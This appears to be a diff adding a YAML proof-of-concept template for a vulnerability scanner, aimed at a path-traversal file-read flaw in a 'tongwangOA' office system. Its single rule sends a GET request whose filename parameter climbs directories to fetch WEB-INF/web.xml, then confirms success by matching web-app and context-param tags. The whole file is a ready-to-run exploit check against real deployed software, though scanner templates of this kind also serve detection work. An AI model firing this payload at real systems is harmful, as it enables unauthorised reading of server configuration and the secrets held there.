@@ -1,0 +1,20 @@
+name: poc-yaml-tongwangOA-tooneAssistantAttachement.jsp-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    expression: response.status == 200 && response.body.bcontains(b'<web-app>') && response.body.bcontains(b'<context-param>')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488008&idx=1&sn=000cae539fcdc3108050d6059a4d04f7&chksm=c267a73bf5102e2df26af1338e16910e3139f2df64ee3b28fc150cd1a145be56cd3635506443&token=48786214&lang=zh_CN#rd
+
+
